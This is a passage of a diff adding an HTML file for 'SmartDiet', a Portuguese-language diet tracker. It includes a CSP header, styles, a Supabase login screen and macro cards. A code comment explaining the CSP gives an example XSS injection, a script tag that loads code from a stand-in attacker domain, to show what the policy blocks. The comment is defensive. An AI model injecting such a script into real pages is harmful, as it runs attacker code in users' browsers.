@@ -1,0 +1,2578 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SmartDiet — Seu rastreador de dieta</title>
+
+  <!-- ================================================================
+    SECURITY HEADERS via meta tags
+    
+    Content-Security-Policy (CSP) — define quais recursos o navegador
+    pode carregar. Se um XSS tentar injetar um <script src="https://hacker.com">,
+    o navegador bloqueia porque esse domínio não está na whitelist.
+
+    Domínios permitidos:
+    - self: o próprio domínio do app
+    - fonts.googleapis.com / fonts.gstatic.com: Google Fonts
+    - cdn.jsdelivr.net: biblioteca Supabase
+    - xxjfursxhsppjmrkwgeb.supabase.co: API do banco
+
+    'unsafe-inline' no script-src: necessário porque nosso JS está inline
+    no HTML. Num projeto mais avançado, separaríamos o JS em arquivos
+    e usaríamos nonces ou hashes. Por agora, o CSP ainda protege contra
+    scripts de domínios externos.
+
+    X-Content-Type-Options: impede o navegador de "adivinhar" o tipo
+    de um arquivo (MIME sniffing), evitando que um .txt seja interpretado
+    como .js.
+  ================================================================ -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
+    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+    font-src https://fonts.gstatic.com;
+    connect-src 'self' https://xxjfursxhsppjmrkwgeb.supabase.co;
+    img-src 'self' data:;
+    frame-src 'none';
+    object-src 'none';
+    base-uri 'self';
+    form-action 'self';
+  " />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+
+  <!-- PWA — permite instalar como app no celular -->
+  <meta name="theme-color" content="#0f1117" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="SmartDiet" />
+  <link rel="manifest" href="manifest.json" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+
+  <style>
+    /* =====================================================================
+       CSS VARIABLES — sistema de design centralizado.
+       Mude uma variável aqui e o app inteiro atualiza.
+    ===================================================================== */
+    :root {
+      --bg-base:        #0f1117;
+      --bg-surface:     #181c27;
+      --bg-elevated:    #1f2436;
+      --bg-hover:       #252a3a;
+
+      --accent:         #4ade80;
+      --accent-dim:     #1a3d28;
+      --accent-text:    #86efac;
+
+      --text-primary:   #e8eaf0;
+      --text-secondary: #8b90a0;
+      --text-muted:     #4a4f63;
+
+      --border:         #252a3a;
+      --border-active:  #4ade80;
+
+      --prot-color:     #818cf8;
+      --carb-color:     #fb923c;
+      --fat-color:      #facc15;
+      --kcal-color:     #f472b6;
+
+      --radius-sm:  6px;
+      --radius-md:  10px;
+      --radius-lg:  16px;
+      --radius-xl:  20px;
+
+      --font-main: 'DM Sans', sans-serif;
+      --font-mono: 'DM Mono', monospace;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-main);
+      background: var(--bg-base);
+      color: var(--text-primary);
+      min-height: 100vh;
+      font-size: 15px;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .app-container {
+      max-width: 680px;
+      margin: 0 auto;
+      padding: 0 16px 100px;
+    }
+
+    /* ===== HEADER ===== */
+    .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px 0 20px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 24px;
+    }
+    .app-logo { font-size: 18px; font-weight: 600; letter-spacing: -0.5px; }
+    .app-logo span { color: var(--accent); }
+
+    /* ===== NAVEGAÇÃO DE DATAS ===== */
+    .date-nav {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 8px 12px;
+      margin-bottom: 24px;
+    }
+    .date-nav button {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      padding: 4px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 16px;
+      transition: all 0.15s;
+      line-height: 1;
+    }
+    .date-nav button:hover { background: var(--bg-elevated); color: var(--text-primary); }
+    .date-display { flex: 1; text-align: center; }
+    .date-display .date-main { font-size: 15px; font-weight: 500; }
+    .date-display .date-sub  { font-size: 12px; color: var(--text-secondary); }
+    .date-today-badge {
+      font-size: 11px; font-weight: 500;
+      background: var(--accent-dim); color: var(--accent-text);
+      padding: 2px 8px; border-radius: 99px; margin-left: 6px;
+    }
+
+    /* ===== CARDS DE MACRO ===== */
+    .macro-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+    .macro-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 14px 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    .macro-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      border-radius: 3px 3px 0 0;
+    }
+    .macro-card.kcal::before { background: var(--kcal-color); }
+    .macro-card.prot::before { background: var(--prot-color); }
+    .macro-card.carb::before { background: var(--carb-color); }
+    .macro-card.fat::before  { background: var(--fat-color);  }
+
+    .macro-label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em; color: var(--text-secondary); margin-bottom: 6px; }
+    .macro-value { font-family: var(--font-mono); font-size: 22px; font-weight: 500; line-height: 1; margin-bottom: 4px; }
+    .macro-card.kcal .macro-value { color: var(--kcal-color); }
+    .macro-card.prot .macro-value { color: var(--prot-color); }
+    .macro-card.carb .macro-value { color: var(--carb-color); }
+    .macro-card.fat  .macro-value { color: var(--fat-color);  }
+    .macro-goal { font-size: 11px; color: var(--text-muted); }
+
+    /* Barra de progresso + porcentagem lado a lado */
+    .macro-progress-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 8px;
+    }
+    .macro-progress { flex: 1; height: 3px; background: var(--bg-elevated); border-radius: 99px; overflow: hidden; }
+    .macro-progress-fill { height: 100%; border-radius: 99px; transition: width 0.4s ease; }
+    .macro-pct {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--text-muted);
+      min-width: 28px;
+      text-align: right;
+    }
+
+    .macro-card.kcal .macro-progress-fill { background: var(--kcal-color); }
+    .macro-card.prot .macro-progress-fill { background: var(--prot-color); }
+    .macro-card.carb .macro-progress-fill { background: var(--carb-color); }
+    .macro-card.fat  .macro-progress-fill { background: var(--fat-color);  }
+
+    /* Header dos macros com botão objetivo */
+    .macro-section-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .btn-goals {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      background: none;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 5px 12px;
+      font-size: 12px;
+      font-weight: 500;
+      font-family: var(--font-main);
+      color: var(--text-secondary);
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+    .btn-goals:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+      background: var(--accent-dim);
+    }
+    .btn-goals svg { flex-shrink: 0; }
+
+    /* ===== SEÇÃO DE REFEIÇÕES ===== */
+    .section-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
+    .section-title { font-size: 13px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-secondary); }
+    .btn-add-meal {
+      display: flex; align-items: center; gap: 6px;
+      background: var(--accent-dim); color: var(--accent-text);
+      border: none; border-radius: var(--radius-md);
+      padding: 6px 14px; font-size: 13px; font-weight: 500;
+      font-family: var(--font-main); cursor: pointer; transition: all 0.15s;
+    }
+    .btn-add-meal:hover { background: #22543d; color: var(--accent); }
+
+    /* ===== CARD DE REFEIÇÃO ===== */
+    .meals-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .meal-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      transition: border-color 0.15s;
+    }
+    .meal-card:hover { border-color: #2e3450; }
+    .meal-card-header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 14px 16px; cursor: pointer; user-select: none;
+    }
+    .meal-card-header:hover { background: var(--bg-hover); }
+    .meal-info { display: flex; align-items: center; gap: 10px; }
+    .meal-icon { width: 34px; height: 34px; border-radius: var(--radius-md); display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; background: var(--accent-dim); }
+    .meal-name { font-size: 14px; font-weight: 500; }
+    .meal-time { font-size: 12px; color: var(--text-secondary); margin-top: 1px; }
+    .meal-summary { display: flex; align-items: center; gap: 12px; }
+    .meal-kcal { font-family: var(--font-mono); font-size: 15px; font-weight: 500; color: var(--kcal-color); }
+    .meal-chevron { color: var(--text-muted); font-size: 12px; transition: transform 0.2s; }
+    .meal-card.expanded .meal-chevron { transform: rotate(180deg); }
+
+    .meal-body { display: none; border-top: 1px solid var(--border); }
+    .meal-card.expanded .meal-body { display: block; }
+
+    .food-table-header {
+      display: grid;
+      grid-template-columns: 1fr 55px 60px 55px 55px 55px;
+      gap: 4px; padding: 8px 16px;
+      border-bottom: 1px solid var(--border);
+    }
+    .food-table-header span { font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); text-align: right; }
+    .food-table-header span:first-child { text-align: left; }
+
+    .food-row {
+      display: grid;
+      grid-template-columns: 1fr 55px 60px 55px 55px 55px;
+      gap: 4px; padding: 10px 16px;
+      border-bottom: 1px solid var(--border);
+      align-items: center; transition: background 0.1s;
+      cursor: pointer;
+    }
+    .food-row:last-of-type { border-bottom: none; }
+    .food-row:hover { background: var(--bg-elevated); }
+    .food-name { font-size: 13px; }
+    .food-val  { font-family: var(--font-mono); font-size: 12px; color: var(--text-secondary); text-align: right; }
+    .food-kcal { font-family: var(--font-mono); font-size: 13px; font-weight: 500; color: var(--text-primary); text-align: right; }
+    .food-delete-btn {
+      background: none; border: none; color: var(--text-muted);
+      cursor: pointer; font-size: 14px; padding: 2px 4px;
+      border-radius: 4px; transition: all 0.15s; display: none;
+    }
+    .food-row:hover .food-delete-btn { display: block; }
+    .food-delete-btn:hover { color: #f87171; background: #2a1515; }
+
+    .add-food-area { padding: 10px 16px; border-top: 1px dashed var(--border); }
+    .btn-add-food {
+      background: none; border: none; color: var(--text-muted);
+      cursor: pointer; font-size: 13px; font-family: var(--font-main);
+      padding: 4px 0; transition: color 0.15s;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .btn-add-food:hover { color: var(--accent); }
+
+    /* ===== ESTADO VAZIO ===== */
+    .empty-state { text-align: center; padding: 48px 20px; color: var(--text-muted); }
+    .empty-state-icon { font-size: 40px; margin-bottom: 12px; }
+    .empty-state-text { font-size: 14px; line-height: 1.6; }
+
+    /* ===== AÇÕES DA REFEIÇÃO (editar, excluir) ===== */
+    .meal-actions {
+      display: flex;
+      gap: 4px;
+      margin-left: 8px;
+    }
+    .meal-action-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 14px;
+      padding: 4px 6px;
+      border-radius: 6px;
+      transition: all 0.15s;
+      line-height: 1;
+      opacity: 0;
+      transition: opacity 0.15s, color 0.15s, background 0.15s;
+    }
+    .meal-card-header:hover .meal-action-btn { opacity: 1; }
+    .meal-action-btn:hover { color: var(--text-primary); background: var(--bg-elevated); }
+    .meal-action-btn.delete:hover { color: #f87171; background: #2a1515; }
+
+    /* ===== BOTÃO DUPLICAR DIA ===== */
+    .btn-duplicate-day {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      width: 100%;
+      padding: 10px;
+      background: none;
+      border: 1px dashed var(--border);
+      border-radius: var(--radius-lg);
+      color: var(--text-muted);
+      font-size: 13px;
+      font-family: var(--font-main);
+      cursor: pointer;
+      transition: all 0.15s;
+      margin-top: 4px;
+    }
+    .btn-duplicate-day:hover {
+      border-color: var(--accent);
+      color: var(--accent-text);
+      background: var(--accent-dim);
+    }
+
+    /* ===== MODAL DUPLICAR DIA ===== */
+    .duplicate-day-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      cursor: pointer;
+      transition: all 0.15s;
+      margin-bottom: 6px;
+    }
+    .duplicate-day-item:hover {
+      border-color: var(--accent);
+      background: var(--accent-dim);
+    }
+    .duplicate-day-date { font-size: 13px; font-weight: 500; }
+    .duplicate-day-info { font-size: 11px; color: var(--text-secondary); font-family: var(--font-mono); }
+
+    /* ===== MODAL BASE ===== */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      backdrop-filter: blur(4px);
+    }
+    .modal-overlay.active { display: flex; }
+    .modal {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      padding: 24px;
+      width: 100%;
+      max-width: 420px;
+      animation: modal-in 0.2s ease;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    @keyframes modal-in {
+      from { opacity: 0; transform: translateY(12px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0)   scale(1); }
+    }
+    .modal-title { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
+
+    /* ===== FORMULÁRIO ===== */
+    .form-group { margin-bottom: 14px; }
+    .form-label {
+      display: block; font-size: 12px; font-weight: 500;
+      text-transform: uppercase; letter-spacing: 0.06em;
+      color: var(--text-secondary); margin-bottom: 6px;
+    }
+    .form-input {
+      width: 100%; background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      color: var(--text-primary); font-family: var(--font-main);
+      font-size: 14px; padding: 10px 12px;
+      outline: none; transition: border-color 0.15s;
+    }
+    .form-input:focus { border-color: var(--accent); }
+    .form-input::placeholder { color: var(--text-muted); }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .form-hint { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
+
+    .modal-actions { display: flex; gap: 8px; margin-top: 20px; }
+    .btn { flex: 1; padding: 11px; border-radius: var(--radius-md); font-family: var(--font-main); font-size: 14px; font-weight: 500; cursor: pointer; border: none; transition: all 0.15s; }
+    .btn-cancel { background: var(--bg-elevated); color: var(--text-secondary); }
+    .btn-cancel:hover { background: var(--bg-hover); color: var(--text-primary); }
+    .btn-confirm { background: var(--accent); color: #0a1a10; font-weight: 600; }
+    .btn-confirm:hover { background: #86efac; }
+
+    /* ===== MODAL DE NOVA REFEIÇÃO ===== */
+    .meal-type-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
+    .meal-type-option {
+      background: var(--bg-elevated); border: 2px solid transparent;
+      border-radius: var(--radius-md); padding: 12px;
+      cursor: pointer; transition: all 0.15s; text-align: left;
+    }
+    .meal-type-option:hover { border-color: var(--border); }
+    .meal-type-option.selected { border-color: var(--accent); background: var(--accent-dim); }
+    .meal-type-emoji { font-size: 22px; margin-bottom: 4px; }
+    .meal-type-name { font-size: 13px; font-weight: 500; display: block; }
+
+    /* ===================================================
+       BIBLIOTECA DE ALIMENTOS — o que é novo nessa versão
+
+       Conceito novo: "busca em tempo real"
+       Enquanto o usuário digita, filtramos a lista e
+       mostramos os resultados. Isso usa o evento 'input'
+       no campo de texto, que dispara a cada letra digitada.
+    =================================================== */
+
+    /* Container de busca com ícone de lupa */
+    .food-search-wrapper {
+      position: relative;  /* necessário para posicionar a lupa dentro */
+      margin-bottom: 8px;
+    }
+    .food-search-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);  /* centraliza verticalmente */
+      color: var(--text-muted);
+      font-size: 14px;
+      pointer-events: none;  /* não bloqueia cliques no input */
+    }
+    .food-search-input {
+      width: 100%; background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      color: var(--text-primary); font-family: var(--font-main);
+      font-size: 14px;
+      padding: 10px 12px 10px 36px;  /* espaço para o ícone de lupa */
+      outline: none; transition: border-color 0.15s;
+    }
+    .food-search-input:focus { border-color: var(--accent); }
+    .food-search-input::placeholder { color: var(--text-muted); }
+
+    /* Lista de resultados que aparece abaixo do campo de busca */
+    .food-suggestions {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      margin-bottom: 12px;
+      /* display: none por padrão — JS mostra quando há resultados */
+      display: none;
+    }
+    .food-suggestions.visible { display: block; }
+
+    /* Cada item da lista de sugestões */
+    .food-suggestion-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 4px 6px 4px 14px;
+      transition: background 0.1s;
+      border-bottom: 1px solid var(--border);
+    }
+    .food-suggestion-item:last-child { border-bottom: none; }
+    .food-suggestion-item:hover { background: var(--bg-hover); }
+
+    /* Bloco principal clicável (nome + macros) */
+    .suggestion-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 0;
+      cursor: pointer;
+      gap: 8px;
+      min-width: 0;  /* permite que o texto seja truncado se for longo */
+    }
+
+    .suggestion-name { font-size: 13px; font-weight: 500; }
+    .suggestion-macros {
+      font-size: 11px;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      flex-shrink: 0;  /* não encolhe se faltar espaço */
+    }
+
+    /* Botão X para remover da biblioteca */
+    .suggestion-delete-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 13px;
+      padding: 6px 8px;
+      border-radius: 6px;
+      transition: all 0.15s;
+      flex-shrink: 0;
+    }
+    .suggestion-delete-btn:hover {
+      color: #f87171;
+      background: #2a1515;
+    }
+
+    /* Badge "novo" que aparece quando o alimento ainda não está na biblioteca */
+    .suggestion-new-badge {
+      font-size: 10px; font-weight: 600;
+      background: var(--accent-dim); color: var(--accent-text);
+      padding: 2px 6px; border-radius: 99px; margin-left: 6px;
+    }
+
+    /* Divisor entre "da biblioteca" e "formulário manual" */
+    .food-divider {
+      display: flex; align-items: center; gap: 10px;
+      margin: 14px 0; color: var(--text-muted); font-size: 12px;
+    }
+    .food-divider::before,
+    .food-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* Campos de macro — ficam ocultos quando um alimento da biblioteca é selecionado */
+    .macro-fields { transition: opacity 0.2s; }
+    .macro-fields.locked { opacity: 0.4; pointer-events: none; }
+
+    /* Indicador de alimento selecionado da biblioteca */
+    .selected-food-indicator {
+      display: none;  /* JS mostra quando um alimento é selecionado */
+      background: var(--accent-dim);
+      border: 1px solid var(--accent);
+      border-radius: var(--radius-md);
+      padding: 10px 14px;
+      margin-bottom: 12px;
+      font-size: 13px;
+      color: var(--accent-text);
+    }
+    .selected-food-indicator.visible {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .selected-food-name { font-weight: 500; }
+    .btn-clear-selection {
+      background: none; border: none;
+      color: var(--accent-text); cursor: pointer;
+      font-size: 16px; padding: 0 4px; line-height: 1;
+    }
+
+    /* ===== BIBLIOTECA (aba separada) ===== */
+    .library-count {
+      font-size: 11px;
+      background: var(--bg-elevated);
+      color: var(--text-secondary);
+      padding: 2px 8px;
+      border-radius: 99px;
+    }
+
+    /* ===== NAVEGAÇÃO INFERIOR (mobile) ===== */
+    .bottom-nav {
+      display: none;
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: var(--bg-surface);
+      border-top: 1px solid var(--border);
+      padding: 10px 20px;
+      padding-bottom: env(safe-area-inset-bottom, 10px);
+      z-index: 100;
+    }
+    .bottom-nav-inner { max-width: 680px; margin: 0 auto; display: flex; justify-content: space-around; }
+    .nav-item {
+      display: flex; flex-direction: column; align-items: center; gap: 3px;
+      color: var(--text-muted); cursor: pointer;
+      padding: 4px 16px; border-radius: var(--radius-md);
+      transition: color 0.15s; border: none; background: none;
+      font-family: var(--font-main);
+    }
+    .nav-item.active { color: var(--accent); }
+    .nav-item span { font-size: 11px; font-weight: 500; }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: fixed; bottom: 80px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: var(--bg-elevated); border: 1px solid var(--border);
+      border-radius: var(--radius-lg); padding: 10px 18px;
+      font-size: 13px; font-weight: 500; color: var(--text-primary);
+      opacity: 0; transition: all 0.25s; pointer-events: none;
+      white-space: nowrap; z-index: 2000;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+    /* ===== TELA DE LOGIN ===== */
+    .auth-screen {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .auth-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      padding: 32px 28px;
+      width: 100%;
+      max-width: 380px;
+    }
+    .auth-logo {
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: -0.5px;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+    .auth-logo span { color: var(--accent); }
+    .auth-subtitle {
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+    }
+    .auth-error {
+      background: #2a1515;
+      color: #f87171;
+      border-radius: var(--radius-md);
+      padding: 8px 12px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      display: none;
+    }
+    .auth-error.visible { display: block; }
+    .auth-toggle {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+      color: var(--text-secondary);
+    }
+    .auth-toggle a {
+      color: var(--accent);
+      cursor: pointer;
+      text-decoration: none;
+    }
+    .auth-toggle a:hover { text-decoration: underline; }
+    .btn-loading { opacity: 0.6; pointer-events: none; }
+
+    /* Esconde o app até o login */
+    .app-container.hidden,
+    .bottom-nav.hidden { display: none !important; }
+
+    /* ===== RESPONSIVIDADE ===== */
+    @media (max-width: 520px) {
+      .macro-grid { grid-template-columns: repeat(2, 1fr); }
+      .food-table-header,
+      .food-row { grid-template-columns: 1fr 45px 55px 45px 45px; }
+      .col-fat { display: none; }
+      .bottom-nav:not(.hidden) { display: block; }
+    }
+  </style>
+
+  <!--
+    SUPABASE CLIENT — biblioteca oficial.
+    Carregamos via CDN (como fizemos com as fontes).
+    Depois no JS, usamos window.supabase para criar o client.
+  -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+</head>
+
+<body>
+
+  <!-- ================================================================
+    TELA DE LOGIN / CADASTRO
+    Aparece quando o usuário não está logado.
+    O Supabase cuida de toda a lógica de autenticação.
+  ================================================================ -->
+  <div class="auth-screen" id="auth-screen">
+    <div class="auth-card">
+      <div class="auth-logo">Smart<span>Diet</span></div>
+      <div class="auth-subtitle" id="auth-subtitle">Entre para acessar seus dados de qualquer lugar</div>
+
+      <div class="auth-error" id="auth-error"></div>
+
+      <div class="form-group">
+        <label class="form-label" for="auth-email">Email</label>
+        <input type="email" id="auth-email" class="form-input" placeholder="seu@email.com" autocomplete="email" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="auth-password">Senha</label>
+        <input type="password" id="auth-password" class="form-input" placeholder="Mínimo 6 caracteres" autocomplete="current-password" />
+      </div>
+
+      <button class="btn btn-confirm" id="btn-auth" style="width:100%;margin-top:8px">Entrar</button>
+
+      <div class="auth-toggle">
+        <span id="auth-toggle-text">Não tem conta?</span>
+        <a id="auth-toggle-link" onclick="toggleAuthMode()">Criar conta</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    APP PRINCIPAL — escondido até o login
+  ================================================================ -->
+  <div class="app-container hidden" id="app-container">
+
+    <!-- CABEÇALHO -->
+    <header class="app-header">
+      <div class="app-logo">Smart<span>Diet</span></div>
+      <div style="display:flex;align-items:center;gap:8px;">
+        <span class="library-count" id="library-count"></span>
+        <button id="btn-logout" style="font-size:12px;background:none;border:1px solid var(--border);border-radius:var(--radius-sm);padding:3px 10px;color:var(--text-muted);cursor:pointer;font-family:var(--font-main);transition:all .15s;" title="Sair da conta">Sair</button>
+      </div>
+    </header>
+
+    <!-- NAVEGAÇÃO DE DATAS -->
+    <div class="date-nav">
+      <button id="btn-prev-day">‹</button>
+      <div class="date-display">
+        <div class="date-main" id="date-main">—</div>
+        <div class="date-sub"  id="date-sub">—</div>
+      </div>
+      <button id="btn-next-day">›</button>
+    </div>
+
+    <!-- MACROS -->
+    <div class="macro-section-header">
+      <span class="section-title">Resumo diário</span>
+      <button class="btn-goals" id="btn-open-goals">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <circle cx="12" cy="12" r="6"/>
+          <circle cx="12" cy="12" r="2"/>
+        </svg>
+        Objetivo
+      </button>
+    </div>
+
+    <div class="macro-grid">
+      <div class="macro-card kcal">
+        <div class="macro-label">Calorias</div>
+        <div class="macro-value" id="total-kcal">0</div>
+        <div class="macro-goal">meta: <span id="goal-kcal">2000</span> kcal</div>
+        <div class="macro-progress-row">
+          <div class="macro-progress"><div class="macro-progress-fill" id="bar-kcal" style="width:0%"></div></div>
+          <span class="macro-pct" id="pct-kcal">0%</span>
+        </div>
+      </div>
+      <div class="macro-card prot">
+        <div class="macro-label">Proteína</div>
+        <div class="macro-value" id="total-prot">0g</div>
+        <div class="macro-goal">meta: <span id="goal-prot">150</span>g</div>
+        <div class="macro-progress-row">
+          <div class="macro-progress"><div class="macro-progress-fill" id="bar-prot" style="width:0%"></div></div>
+          <span class="macro-pct" id="pct-prot">0%</span>
+        </div>
+      </div>
+      <div class="macro-card carb">
+        <div class="macro-label">Carboidrato</div>
+        <div class="macro-value" id="total-carb">0g</div>
+        <div class="macro-goal">meta: <span id="goal-carb">200</span>g</div>
+        <div class="macro-progress-row">
+          <div class="macro-progress"><div class="macro-progress-fill" id="bar-carb" style="width:0%"></div></div>
+          <span class="macro-pct" id="pct-carb">0%</span>
+        </div>
+      </div>
+      <div class="macro-card fat">
+        <div class="macro-label">Gordura</div>
+        <div class="macro-value" id="total-fat">0g</div>
+        <div class="macro-goal">meta: <span id="goal-fat">65</span>g</div>
+        <div class="macro-progress-row">
+          <div class="macro-progress"><div class="macro-progress-fill" id="bar-fat" style="width:0%"></div></div>
+          <span class="macro-pct" id="pct-fat">0%</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- REFEIÇÕES -->
+    <div class="section-header">
+      <span class="section-title">Refeições</span>
+      <button class="btn-add-meal" id="btn-open-meal-modal">+ Nova refeição</button>
+    </div>
+
+    <div class="meals-list" id="meals-list">
+      <div class="empty-state" id="empty-state">
+        <div class="empty-state-icon">🥗</div>
+        <div class="empty-state-text">
+          Nenhuma refeição registrada hoje.<br>
+          Clique em <strong>+ Nova refeição</strong> para começar.
+        </div>
+      </div>
+    </div>
+
+    <!-- Botão de duplicar refeições de outro dia -->
+    <button class="btn-duplicate-day" id="btn-duplicate-day">
+      📋 Copiar refeições de outro dia
+    </button>
+
+  </div>
+
+  <!-- NAVEGAÇÃO INFERIOR (mobile) -->
+  <nav class="bottom-nav hidden" id="bottom-nav">
+    <div class="bottom-nav-inner">
+      <button class="nav-item active">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+        <span>Hoje</span>
+      </button>
+      <button class="nav-item">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+        <span>Histórico</span>
+      </button>
+      <button class="nav-item">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
+        <span>Gráficos</span>
+      </button>
+      <button class="nav-item">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M20 21a8 8 0 1 0-16 0"/></svg>
+        <span>Perfil</span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- MODAL: NOVA REFEIÇÃO -->
+  <div class="modal-overlay" id="modal-meal">
+    <div class="modal">
+      <div class="modal-title">Nova refeição</div>
+      <div class="form-group">
+        <label class="form-label">Tipo de refeição</label>
+        <div class="meal-type-grid" id="meal-type-grid">
+          <div class="meal-type-option selected" data-type="Café da manhã" data-emoji="☀️">
+            <div class="meal-type-emoji">☀️</div>
+            <span class="meal-type-name">Café da manhã</span>
+          </div>
+          <div class="meal-type-option" data-type="Almoço" data-emoji="🍽️">
+            <div class="meal-type-emoji">🍽️</div>
